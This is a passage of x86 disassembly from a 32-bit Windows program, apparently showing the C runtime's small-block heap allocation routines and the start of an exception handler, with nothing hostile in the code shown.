  426b10:	jmp    0x426ae2
  426b12:	or     DWORD PTR [esi+0x8],0xffffffff
  426b16:	mov    DWORD PTR [esi],edi
  426b18:	mov    DWORD PTR [esi+0x4],edi
  426b1b:	inc    DWORD PTR ds:0x45defc
  426b21:	mov    eax,DWORD PTR [esi+0x10]
  426b24:	or     DWORD PTR [eax],0xffffffff
  426b27:	mov    eax,esi
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	ret    
  426b2c:	push   ebp
  426b2d:	mov    ebp,esp
  426b2f:	push   ecx
  426b30:	push   ecx
  426b31:	mov    ecx,DWORD PTR [ebp+0x8]
  426b34:	mov    eax,DWORD PTR [ecx+0x8]
  426b37:	push   ebx
  426b38:	push   esi
  426b39:	mov    esi,DWORD PTR [ecx+0x10]
  426b3c:	push   edi
  426b3d:	xor    ebx,ebx
  426b3f:	jmp    0x426b44
  426b41:	shl    eax,1
  426b43:	inc    ebx
  426b44:	test   eax,eax
  426b46:	jge    0x426b41
  426b48:	mov    eax,ebx
  426b4a:	imul   eax,eax,0x204
  426b50:	lea    eax,[eax+esi*1+0x144]
  426b57:	push   0x3f
  426b59:	mov    DWORD PTR [ebp-0x8],eax
  426b5c:	pop    edx
  426b5d:	mov    DWORD PTR [eax+0x8],eax
  426b60:	mov    DWORD PTR [eax+0x4],eax
  426b63:	add    eax,0x8
  426b66:	dec    edx
  426b67:	jne    0x426b5d
  426b69:	push   0x4
  426b6b:	mov    edi,ebx
  426b6d:	push   0x1000
  426b72:	shl    edi,0xf
  426b75:	add    edi,DWORD PTR [ecx+0xc]
  426b78:	push   0x8000
  426b7d:	push   edi
  426b7e:	call   DWORD PTR ds:0x4290d0
  426b84:	test   eax,eax
  426b86:	jne    0x426b90
  426b88:	or     eax,0xffffffff
  426b8b:	jmp    0x426c2d
  426b90:	lea    edx,[edi+0x7000]
  426b96:	cmp    edi,edx
  426b98:	mov    DWORD PTR [ebp-0x4],edx
  426b9b:	ja     0x426be0
  426b9d:	mov    ecx,edx
  426b9f:	sub    ecx,edi
  426ba1:	shr    ecx,0xc
  426ba4:	lea    eax,[edi+0x10]
  426ba7:	inc    ecx
  426ba8:	or     DWORD PTR [eax-0x8],0xffffffff
  426bac:	or     DWORD PTR [eax+0xfec],0xffffffff
  426bb3:	lea    edx,[eax+0xffc]
  426bb9:	mov    DWORD PTR [eax],edx
  426bbb:	lea    edx,[eax-0x1004]
  426bc1:	mov    DWORD PTR [eax-0x4],0xff0
  426bc8:	mov    DWORD PTR [eax+0x4],edx
  426bcb:	mov    DWORD PTR [eax+0xfe8],0xff0
  426bd5:	add    eax,0x1000
  426bda:	dec    ecx
  426bdb:	jne    0x426ba8
  426bdd:	mov    edx,DWORD PTR [ebp-0x4]
  426be0:	mov    eax,DWORD PTR [ebp-0x8]
  426be3:	add    eax,0x1f8
  426be8:	lea    ecx,[edi+0xc]
  426beb:	mov    DWORD PTR [eax+0x4],ecx
  426bee:	mov    DWORD PTR [ecx+0x8],eax
  426bf1:	lea    ecx,[edx+0xc]
  426bf4:	mov    DWORD PTR [eax+0x8],ecx
  426bf7:	mov    DWORD PTR [ecx+0x4],eax
  426bfa:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426bff:	xor    edi,edi
  426c01:	inc    edi
  426c02:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426c09:	mov    al,BYTE PTR [esi+0x43]
  426c0c:	mov    cl,al
  426c0e:	inc    cl
  426c10:	test   al,al
  426c12:	mov    eax,DWORD PTR [ebp+0x8]
  426c15:	mov    BYTE PTR [esi+0x43],cl
  426c18:	jne    0x426c1d
  426c1a:	or     DWORD PTR [eax+0x4],edi
  426c1d:	mov    edx,0x80000000
  426c22:	mov    ecx,ebx
  426c24:	shr    edx,cl
  426c26:	not    edx
  426c28:	and    DWORD PTR [eax+0x8],edx
  426c2b:	mov    eax,ebx
  426c2d:	pop    edi
  426c2e:	pop    esi
  426c2f:	pop    ebx
  426c30:	leave  
  426c31:	ret    
  426c32:	push   ebp
  426c33:	mov    ebp,esp
  426c35:	sub    esp,0xc
  426c38:	mov    ecx,DWORD PTR [ebp+0x8]
  426c3b:	mov    eax,DWORD PTR [ecx+0x10]
  426c3e:	push   ebx
  426c3f:	push   esi
  426c40:	mov    esi,DWORD PTR [ebp+0x10]
  426c43:	push   edi
  426c44:	mov    edi,DWORD PTR [ebp+0xc]
  426c47:	mov    edx,edi
  426c49:	sub    edx,DWORD PTR [ecx+0xc]
  426c4c:	add    esi,0x17
  426c4f:	shr    edx,0xf
  426c52:	mov    ecx,edx
  426c54:	imul   ecx,ecx,0x204
  426c5a:	lea    ecx,[ecx+eax*1+0x144]
  426c61:	mov    DWORD PTR [ebp-0xc],ecx
  426c64:	mov    ecx,DWORD PTR [edi-0x4]
  426c67:	and    esi,0xfffffff0
  426c6a:	dec    ecx
  426c6b:	cmp    esi,ecx
  426c6d:	lea    edi,[ecx+edi*1-0x4]
  426c71:	mov    ebx,DWORD PTR [edi]
  426c73:	mov    DWORD PTR [ebp+0x10],ecx
  426c76:	mov    DWORD PTR [ebp-0x4],ebx
  426c79:	jle    0x426dd4
  426c7f:	test   bl,0x1
  426c82:	jne    0x426dcd
  426c88:	add    ebx,ecx
  426c8a:	cmp    esi,ebx
  426c8c:	jg     0x426dcd
  426c92:	mov    ecx,DWORD PTR [ebp-0x4]
  426c95:	sar    ecx,0x4
  426c98:	dec    ecx
  426c99:	cmp    ecx,0x3f
  426c9c:	mov    DWORD PTR [ebp-0x8],ecx
  426c9f:	jbe    0x426ca7
  426ca1:	push   0x3f
  426ca3:	pop    ecx
  426ca4:	mov    DWORD PTR [ebp-0x8],ecx
  426ca7:	mov    ebx,DWORD PTR [edi+0x4]
  426caa:	cmp    ebx,DWORD PTR [edi+0x8]
  426cad:	jne    0x426cf2
  426caf:	cmp    ecx,0x20
  426cb2:	mov    ebx,0x80000000
  426cb7:	jae    0x426cd3
  426cb9:	shr    ebx,cl
  426cbb:	mov    ecx,DWORD PTR [ebp-0x8]
  426cbe:	lea    ecx,[ecx+eax*1+0x4]
  426cc2:	not    ebx
  426cc4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426cc8:	dec    BYTE PTR [ecx]
  426cca:	jne    0x426cf2
  426ccc:	mov    ecx,DWORD PTR [ebp+0x8]
  426ccf:	and    DWORD PTR [ecx],ebx
  426cd1:	jmp    0x426cf2
  426cd3:	add    ecx,0xffffffe0
  426cd6:	shr    ebx,cl
  426cd8:	mov    ecx,DWORD PTR [ebp-0x8]
  426cdb:	lea    ecx,[ecx+eax*1+0x4]
  426cdf:	not    ebx
  426ce1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426ce8:	dec    BYTE PTR [ecx]
  426cea:	jne    0x426cf2
  426cec:	mov    ecx,DWORD PTR [ebp+0x8]
  426cef:	and    DWORD PTR [ecx+0x4],ebx
  426cf2:	mov    ecx,DWORD PTR [edi+0x8]
  426cf5:	mov    ebx,DWORD PTR [edi+0x4]
  426cf8:	mov    DWORD PTR [ecx+0x4],ebx
  426cfb:	mov    ecx,DWORD PTR [edi+0x4]
  426cfe:	mov    edi,DWORD PTR [edi+0x8]
  426d01:	mov    DWORD PTR [ecx+0x8],edi
  426d04:	mov    ecx,DWORD PTR [ebp+0x10]
  426d07:	sub    ecx,esi
  426d09:	add    DWORD PTR [ebp-0x4],ecx
  426d0c:	cmp    DWORD PTR [ebp-0x4],0x0
  426d10:	jle    0x426dbb
  426d16:	mov    edi,DWORD PTR [ebp-0x4]
  426d19:	mov    ecx,DWORD PTR [ebp+0xc]
  426d1c:	sar    edi,0x4
  426d1f:	dec    edi
  426d20:	cmp    edi,0x3f
  426d23:	lea    ecx,[ecx+esi*1-0x4]
  426d27:	jbe    0x426d2c
  426d29:	push   0x3f
  426d2b:	pop    edi
  426d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  426d2f:	lea    ebx,[ebx+edi*8]
  426d32:	mov    DWORD PTR [ebp+0x10],ebx
  426d35:	mov    ebx,DWORD PTR [ebx+0x4]
  426d38:	mov    DWORD PTR [ecx+0x4],ebx
  426d3b:	mov    ebx,DWORD PTR [ebp+0x10]
  426d3e:	mov    DWORD PTR [ecx+0x8],ebx
  426d41:	mov    DWORD PTR [ebx+0x4],ecx
  426d44:	mov    ebx,DWORD PTR [ecx+0x4]
  426d47:	mov    DWORD PTR [ebx+0x8],ecx
  426d4a:	mov    ebx,DWORD PTR [ecx+0x4]
  426d4d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426d50:	jne    0x426da9
  426d52:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426d56:	mov    BYTE PTR [ebp+0x13],cl
  426d59:	inc    cl
  426d5b:	cmp    edi,0x20
  426d5e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426d62:	jae    0x426d80
  426d64:	cmp    BYTE PTR [ebp+0x13],0x0
  426d68:	jne    0x426d78
  426d6a:	mov    ecx,edi
  426d6c:	mov    ebx,0x80000000
  426d71:	shr    ebx,cl
  426d73:	mov    ecx,DWORD PTR [ebp+0x8]
  426d76:	or     DWORD PTR [ecx],ebx
  426d78:	lea    eax,[eax+edx*4+0x44]
  426d7c:	mov    ecx,edi
  426d7e:	jmp    0x426da0
  426d80:	cmp    BYTE PTR [ebp+0x13],0x0
  426d84:	jne    0x426d96
  426d86:	lea    ecx,[edi-0x20]
  426d89:	mov    ebx,0x80000000
  426d8e:	shr    ebx,cl
  426d90:	mov    ecx,DWORD PTR [ebp+0x8]
  426d93:	or     DWORD PTR [ecx+0x4],ebx
  426d96:	lea    eax,[eax+edx*4+0xc4]
  426d9d:	lea    ecx,[edi-0x20]
  426da0:	mov    edx,0x80000000
  426da5:	shr    edx,cl
  426da7:	or     DWORD PTR [eax],edx
  426da9:	mov    edx,DWORD PTR [ebp+0xc]
  426dac:	mov    ecx,DWORD PTR [ebp-0x4]
  426daf:	lea    eax,[edx+esi*1-0x4]
  426db3:	mov    DWORD PTR [eax],ecx
  426db5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426db9:	jmp    0x426dbe
  426dbb:	mov    edx,DWORD PTR [ebp+0xc]
  426dbe:	lea    eax,[esi+0x1]
  426dc1:	mov    DWORD PTR [edx-0x4],eax
  426dc4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426dc8:	jmp    0x426f09
  426dcd:	xor    eax,eax
  426dcf:	jmp    0x426f0c
  426dd4:	jge    0x426f09
  426dda:	mov    ebx,DWORD PTR [ebp+0xc]
  426ddd:	sub    DWORD PTR [ebp+0x10],esi
  426de0:	lea    ecx,[esi+0x1]
  426de3:	mov    DWORD PTR [ebx-0x4],ecx
  426de6:	lea    ebx,[ebx+esi*1-0x4]
  426dea:	mov    esi,DWORD PTR [ebp+0x10]
  426ded:	sar    esi,0x4
  426df0:	dec    esi
  426df1:	cmp    esi,0x3f
  426df4:	mov    DWORD PTR [ebp+0xc],ebx
  426df7:	mov    DWORD PTR [ebx-0x4],ecx
  426dfa:	jbe    0x426dff
  426dfc:	push   0x3f
  426dfe:	pop    esi
  426dff:	test   BYTE PTR [ebp-0x4],0x1
  426e03:	jne    0x426e89
  426e09:	mov    esi,DWORD PTR [ebp-0x4]
  426e0c:	sar    esi,0x4
  426e0f:	dec    esi
  426e10:	cmp    esi,0x3f
  426e13:	jbe    0x426e18
  426e15:	push   0x3f
  426e17:	pop    esi
  426e18:	mov    ecx,DWORD PTR [edi+0x4]
  426e1b:	cmp    ecx,DWORD PTR [edi+0x8]
  426e1e:	jne    0x426e62
  426e20:	cmp    esi,0x20
  426e23:	mov    ebx,0x80000000
  426e28:	jae    0x426e43
  426e2a:	mov    ecx,esi
  426e2c:	shr    ebx,cl
  426e2e:	lea    esi,[esi+eax*1+0x4]
  426e32:	not    ebx
  426e34:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426e38:	dec    BYTE PTR [esi]
  426e3a:	jne    0x426e5f
  426e3c:	mov    ecx,DWORD PTR [ebp+0x8]
  426e3f:	and    DWORD PTR [ecx],ebx
  426e41:	jmp    0x426e5f
  426e43:	lea    ecx,[esi-0x20]
  426e46:	shr    ebx,cl
  426e48:	lea    ecx,[esi+eax*1+0x4]
  426e4c:	not    ebx
  426e4e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426e55:	dec    BYTE PTR [ecx]
  426e57:	jne    0x426e5f
  426e59:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5c:	and    DWORD PTR [ecx+0x4],ebx
  426e5f:	mov    ebx,DWORD PTR [ebp+0xc]
  426e62:	mov    ecx,DWORD PTR [edi+0x8]
  426e65:	mov    esi,DWORD PTR [edi+0x4]
  426e68:	mov    DWORD PTR [ecx+0x4],esi
  426e6b:	mov    esi,DWORD PTR [edi+0x8]
  426e6e:	mov    ecx,DWORD PTR [edi+0x4]
  426e71:	mov    DWORD PTR [ecx+0x8],esi
  426e74:	mov    esi,DWORD PTR [ebp+0x10]
  426e77:	add    esi,DWORD PTR [ebp-0x4]
  426e7a:	mov    DWORD PTR [ebp+0x10],esi
  426e7d:	sar    esi,0x4
  426e80:	dec    esi
  426e81:	cmp    esi,0x3f
  426e84:	jbe    0x426e89
  426e86:	push   0x3f
  426e88:	pop    esi
  426e89:	mov    ecx,DWORD PTR [ebp-0xc]
  426e8c:	lea    ecx,[ecx+esi*8]
  426e8f:	mov    edi,DWORD PTR [ecx+0x4]
  426e92:	mov    DWORD PTR [ebx+0x8],ecx
  426e95:	mov    DWORD PTR [ebx+0x4],edi
  426e98:	mov    DWORD PTR [ecx+0x4],ebx
  426e9b:	mov    ecx,DWORD PTR [ebx+0x4]
  426e9e:	mov    DWORD PTR [ecx+0x8],ebx
  426ea1:	mov    ecx,DWORD PTR [ebx+0x4]
  426ea4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426ea7:	jne    0x426f00
  426ea9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ead:	mov    BYTE PTR [ebp+0xf],cl
  426eb0:	inc    cl
  426eb2:	cmp    esi,0x20
  426eb5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426eb9:	jae    0x426ed7
  426ebb:	cmp    BYTE PTR [ebp+0xf],0x0
  426ebf:	jne    0x426ecf
  426ec1:	mov    ecx,esi
  426ec3:	mov    edi,0x80000000
  426ec8:	shr    edi,cl
  426eca:	mov    ecx,DWORD PTR [ebp+0x8]
  426ecd:	or     DWORD PTR [ecx],edi
  426ecf:	lea    eax,[eax+edx*4+0x44]
  426ed3:	mov    ecx,esi
  426ed5:	jmp    0x426ef7
  426ed7:	cmp    BYTE PTR [ebp+0xf],0x0
  426edb:	jne    0x426eed
  426edd:	lea    ecx,[esi-0x20]
  426ee0:	mov    edi,0x80000000
  426ee5:	shr    edi,cl
  426ee7:	mov    ecx,DWORD PTR [ebp+0x8]
  426eea:	or     DWORD PTR [ecx+0x4],edi
  426eed:	lea    eax,[eax+edx*4+0xc4]
  426ef4:	lea    ecx,[esi-0x20]
  426ef7:	mov    edx,0x80000000
  426efc:	shr    edx,cl
  426efe:	or     DWORD PTR [eax],edx
  426f00:	mov    eax,DWORD PTR [ebp+0x10]
  426f03:	mov    DWORD PTR [ebx],eax
  426f05:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426f09:	xor    eax,eax
  426f0b:	inc    eax
  426f0c:	pop    edi
  426f0d:	pop    esi
  426f0e:	pop    ebx
  426f0f:	leave  
  426f10:	ret    
  426f11:	push   ebp
  426f12:	mov    ebp,esp
  426f14:	sub    esp,0x14
  426f17:	mov    ecx,DWORD PTR [ebp+0x8]
  426f1a:	mov    eax,ds:0x45defc
  426f1f:	mov    edx,DWORD PTR ds:0x45df00
  426f25:	add    ecx,0x17
  426f28:	and    ecx,0xfffffff0
  426f2b:	push   ebx
  426f2c:	mov    DWORD PTR [ebp-0x10],ecx
  426f2f:	sar    ecx,0x4
  426f32:	push   esi
  426f33:	lea    eax,[eax+eax*4]
  426f36:	push   edi
  426f37:	dec    ecx
  426f38:	cmp    ecx,0x20
  426f3b:	lea    edi,[edx+eax*4]
  426f3e:	mov    DWORD PTR [ebp-0x4],edi
  426f41:	jge    0x426f4e
  426f43:	or     esi,0xffffffff
  426f46:	shr    esi,cl
  426f48:	or     DWORD PTR [ebp-0x8],0xffffffff
  426f4c:	jmp    0x426f5b
  426f4e:	add    ecx,0xffffffe0
  426f51:	or     eax,0xffffffff
  426f54:	xor    esi,esi
  426f56:	shr    eax,cl
  426f58:	mov    DWORD PTR [ebp-0x8],eax
  426f5b:	mov    eax,ds:0x45df08
  426f60:	mov    ebx,eax
  426f62:	mov    DWORD PTR [ebp-0xc],esi
  426f65:	cmp    ebx,edi
  426f67:	jmp    0x426f7d
  426f69:	mov    ecx,DWORD PTR [ebx+0x4]
  426f6c:	mov    edi,DWORD PTR [ebx]
  426f6e:	and    ecx,DWORD PTR [ebp-0x8]
  426f71:	and    edi,esi
  426f73:	or     ecx,edi
  426f75:	jne    0x426f82
  426f77:	add    ebx,0x14
  426f7a:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f7d:	mov    DWORD PTR [ebp+0x8],ebx
  426f80:	jb     0x426f69
  426f82:	cmp    ebx,DWORD PTR [ebp-0x4]
  426f85:	jne    0x426fab
  426f87:	mov    ebx,edx
  426f89:	jmp    0x426f9c
  426f8b:	mov    ecx,DWORD PTR [ebx+0x4]
  426f8e:	mov    edi,DWORD PTR [ebx]
  426f90:	and    ecx,DWORD PTR [ebp-0x8]
  426f93:	and    edi,esi
  426f95:	or     ecx,edi
  426f97:	jne    0x426fa3
  426f99:	add    ebx,0x14
  426f9c:	cmp    ebx,eax
  426f9e:	mov    DWORD PTR [ebp+0x8],ebx
  426fa1:	jb     0x426f8b
  426fa3:	cmp    ebx,eax
  426fa5:	je     0x42703f
  426fab:	mov    DWORD PTR ds:0x45df08,ebx
  426fb1:	mov    eax,DWORD PTR [ebx+0x10]
  426fb4:	mov    edx,DWORD PTR [eax]
  426fb6:	cmp    edx,0xffffffff
  426fb9:	mov    DWORD PTR [ebp-0x4],edx
  426fbc:	je     0x426fd2
  426fbe:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  426fc5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  426fc9:	and    ecx,DWORD PTR [ebp-0x8]
  426fcc:	and    edi,esi
  426fce:	or     ecx,edi
  426fd0:	jne    0x427008
  426fd2:	mov    edx,DWORD PTR [eax+0xc4]
  426fd8:	and    edx,DWORD PTR [ebp-0x8]
  426fdb:	and    DWORD PTR [ebp-0x4],0x0
  426fdf:	lea    ecx,[eax+0x44]
  426fe2:	mov    esi,DWORD PTR [ecx]
  426fe4:	and    esi,DWORD PTR [ebp-0xc]
  426fe7:	or     edx,esi
  426fe9:	mov    esi,DWORD PTR [ebp-0xc]
  426fec:	jne    0x427005
  426fee:	mov    edx,DWORD PTR [ecx+0x84]
  426ff4:	and    edx,DWORD PTR [ebp-0x8]
  426ff7:	inc    DWORD PTR [ebp-0x4]
  426ffa:	add    ecx,0x4
  426ffd:	mov    edi,DWORD PTR [ecx]
  426fff:	and    edi,esi
  427001:	or     edx,edi
  427003:	je     0x426fee
  427005:	mov    edx,DWORD PTR [ebp-0x4]
  427008:	mov    ecx,edx
  42700a:	imul   ecx,ecx,0x204
  427010:	lea    ecx,[ecx+eax*1+0x144]
  427017:	mov    DWORD PTR [ebp-0xc],ecx
  42701a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42701e:	xor    edi,edi
  427020:	and    ecx,esi
  427022:	jne    0x427091
  427024:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42702b:	and    ecx,DWORD PTR [ebp-0x8]
  42702e:	push   0x20
  427030:	pop    edi
  427031:	jmp    0x427091
  427033:	cmp    DWORD PTR [ebx+0x8],0x0
  427037:	jne    0x427044
  427039:	add    ebx,0x14
  42703c:	mov    DWORD PTR [ebp+0x8],ebx
  42703f:	cmp    ebx,DWORD PTR [ebp-0x4]
  427042:	jb     0x427033
  427044:	cmp    ebx,DWORD PTR [ebp-0x4]
  427047:	jne    0x42706f
  427049:	mov    ebx,edx
  42704b:	jmp    0x427056
  42704d:	cmp    DWORD PTR [ebx+0x8],0x0
  427051:	jne    0x42705d
  427053:	add    ebx,0x14
  427056:	cmp    ebx,eax
  427058:	mov    DWORD PTR [ebp+0x8],ebx
  42705b:	jb     0x42704d
  42705d:	cmp    ebx,eax
  42705f:	jne    0x42706f
  427061:	call   0x426a75
  427066:	mov    ebx,eax
  427068:	test   ebx,ebx
  42706a:	mov    DWORD PTR [ebp+0x8],ebx
  42706d:	je     0x427087
  42706f:	push   ebx
  427070:	call   0x426b2c
  427075:	pop    ecx
  427076:	mov    ecx,DWORD PTR [ebx+0x10]
  427079:	mov    DWORD PTR [ecx],eax
  42707b:	mov    eax,DWORD PTR [ebx+0x10]
  42707e:	cmp    DWORD PTR [eax],0xffffffff
  427081:	jne    0x426fab
  427087:	xor    eax,eax
  427089:	jmp    0x427208
  42708e:	shl    ecx,1
  427090:	inc    edi
  427091:	test   ecx,ecx
  427093:	jge    0x42708e
  427095:	mov    ecx,DWORD PTR [ebp-0xc]
  427098:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  42709c:	mov    ecx,DWORD PTR [edx]
  42709e:	sub    ecx,DWORD PTR [ebp-0x10]
  4270a1:	mov    esi,ecx
  4270a3:	sar    esi,0x4
  4270a6:	dec    esi
  4270a7:	cmp    esi,0x3f
  4270aa:	mov    DWORD PTR [ebp-0x8],ecx
  4270ad:	jle    0x4270b2
  4270af:	push   0x3f
  4270b1:	pop    esi
  4270b2:	cmp    esi,edi
  4270b4:	je     0x4271bb
  4270ba:	mov    ecx,DWORD PTR [edx+0x4]
  4270bd:	cmp    ecx,DWORD PTR [edx+0x8]
  4270c0:	jne    0x42711e
  4270c2:	cmp    edi,0x20
  4270c5:	mov    ebx,0x80000000
  4270ca:	jge    0x4270f2
  4270cc:	mov    ecx,edi
  4270ce:	shr    ebx,cl
  4270d0:	mov    ecx,DWORD PTR [ebp-0x4]
  4270d3:	lea    edi,[eax+edi*1+0x4]
  4270d7:	not    ebx
  4270d9:	mov    DWORD PTR [ebp-0x14],ebx
  4270dc:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4270e0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4270e4:	dec    BYTE PTR [edi]
  4270e6:	jne    0x42711b
  4270e8:	mov    ecx,DWORD PTR [ebp-0x14]
  4270eb:	mov    ebx,DWORD PTR [ebp+0x8]
  4270ee:	and    DWORD PTR [ebx],ecx
  4270f0:	jmp    0x42711e
  4270f2:	lea    ecx,[edi-0x20]
  4270f5:	shr    ebx,cl
  4270f7:	mov    ecx,DWORD PTR [ebp-0x4]
  4270fa:	lea    ecx,[eax+ecx*4+0xc4]
  427101:	lea    edi,[eax+edi*1+0x4]
  427105:	not    ebx
  427107:	and    DWORD PTR [ecx],ebx
  427109:	dec    BYTE PTR [edi]
  42710b:	mov    DWORD PTR [ebp-0x14],ebx
  42710e:	jne    0x42711b
  427110:	mov    ebx,DWORD PTR [ebp+0x8]
  427113:	mov    ecx,DWORD PTR [ebp-0x14]
  427116:	and    DWORD PTR [ebx+0x4],ecx
  427119:	jmp    0x42711e
  42711b:	mov    ebx,DWORD PTR [ebp+0x8]
  42711e:	cmp    DWORD PTR [ebp-0x8],0x0
  427122:	mov    ecx,DWORD PTR [edx+0x8]
  427125:	mov    edi,DWORD PTR [edx+0x4]
  427128:	mov    DWORD PTR [ecx+0x4],edi
  42712b:	mov    ecx,DWORD PTR [edx+0x4]
  42712e:	mov    edi,DWORD PTR [edx+0x8]
  427131:	mov    DWORD PTR [ecx+0x8],edi
  427134:	je     0x4271c7
  42713a:	mov    ecx,DWORD PTR [ebp-0xc]
  42713d:	lea    ecx,[ecx+esi*8]
  427140:	mov    edi,DWORD PTR [ecx+0x4]
  427143:	mov    DWORD PTR [edx+0x8],ecx
  427146:	mov    DWORD PTR [edx+0x4],edi
  427149:	mov    DWORD PTR [ecx+0x4],edx
  42714c:	mov    ecx,DWORD PTR [edx+0x4]
  42714f:	mov    DWORD PTR [ecx+0x8],edx
  427152:	mov    ecx,DWORD PTR [edx+0x4]
  427155:	cmp    ecx,DWORD PTR [edx+0x8]
  427158:	jne    0x4271b8
  42715a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42715e:	mov    BYTE PTR [ebp+0xb],cl
  427161:	inc    cl
  427163:	cmp    esi,0x20
  427166:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42716a:	jge    0x42718f
  42716c:	cmp    BYTE PTR [ebp+0xb],0x0
  427170:	jne    0x42717d
  427172:	mov    edi,0x80000000
  427177:	mov    ecx,esi
  427179:	shr    edi,cl
  42717b:	or     DWORD PTR [ebx],edi
  42717d:	mov    ecx,esi
  42717f:	mov    edi,0x80000000
  427184:	shr    edi,cl
  427186:	mov    ecx,DWORD PTR [ebp-0x4]
  427189:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42718d:	jmp    0x4271b8
  42718f:	cmp    BYTE PTR [ebp+0xb],0x0
  427193:	jne    0x4271a2
  427195:	lea    ecx,[esi-0x20]
  427198:	mov    edi,0x80000000
  42719d:	shr    edi,cl
  42719f:	or     DWORD PTR [ebx+0x4],edi
  4271a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4271a5:	lea    edi,[eax+ecx*4+0xc4]
  4271ac:	lea    ecx,[esi-0x20]
  4271af:	mov    esi,0x80000000
  4271b4:	shr    esi,cl
  4271b6:	or     DWORD PTR [edi],esi
  4271b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4271bb:	test   ecx,ecx
  4271bd:	je     0x4271ca
  4271bf:	mov    DWORD PTR [edx],ecx
  4271c1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4271c5:	jmp    0x4271ca
  4271c7:	mov    ecx,DWORD PTR [ebp-0x8]
  4271ca:	mov    esi,DWORD PTR [ebp-0x10]
  4271cd:	add    edx,ecx
  4271cf:	lea    ecx,[esi+0x1]
  4271d2:	mov    DWORD PTR [edx],ecx
  4271d4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271d8:	mov    esi,DWORD PTR [ebp-0xc]
  4271db:	mov    ecx,DWORD PTR [esi]
  4271dd:	test   ecx,ecx
  4271df:	lea    edi,[ecx+0x1]
  4271e2:	mov    DWORD PTR [esi],edi
  4271e4:	jne    0x427200
  4271e6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271ec:	jne    0x427200
  4271ee:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271f7:	jne    0x427200
  4271f9:	and    DWORD PTR ds:0x45def8,0x0
  427200:	mov    ecx,DWORD PTR [ebp-0x4]
  427203:	mov    DWORD PTR [eax],ecx
  427205:	lea    eax,[edx+0x4]
  427208:	pop    edi
  427209:	pop    esi
  42720a:	pop    ebx
  42720b:	leave  
  42720c:	ret    
  42720d:	int3   
  42720e:	int3   
  42720f:	int3   
  427210:	push   esi
  427211:	inc    ebx
  427212:	xor    dh,BYTE PTR [eax]
  427214:	pop    eax
  427215:	inc    ebx
  427216:	xor    BYTE PTR [eax],dh
  427218:	push   ebp
  427219:	mov    ebp,esp
  42721b:	sub    esp,0x8
  42721e:	push   ebx
  42721f:	push   esi
  427220:	push   edi
  427221:	push   ebp
  427222:	cld    
  427223:	mov    ebx,DWORD PTR [ebp+0xc]
  427226:	mov    eax,DWORD PTR [ebp+0x8]
  427229:	test   DWORD PTR [eax+0x4],0x6
  427230:	jne    0x4272b8
  427236:	mov    DWORD PTR [ebp-0x8],eax
  427239:	mov    eax,DWORD PTR [ebp+0x10]
  42723c:	mov    DWORD PTR [ebp-0x4],eax
  42723f:	lea    eax,[ebp-0x8]
  427242:	mov    DWORD PTR [ebx-0x4],eax
  427245:	mov    esi,DWORD PTR [ebx+0xc]
  427248:	mov    edi,DWORD PTR [ebx+0x8]
  42724b:	cmp    esi,0xffffffff
  42724e:	je     0x4272b1
  427250:	lea    ecx,[esi+esi*2]
  427253:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427258:	je     0x42729f
  42725a:	push   esi
  42725b:	push   ebp
  42725c:	lea    ebp,[ebx+0x10]
  42725f:	call   DWORD PTR [edi+ecx*4+0x4]
  427263:	pop    ebp
  427264:	pop    esi
  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
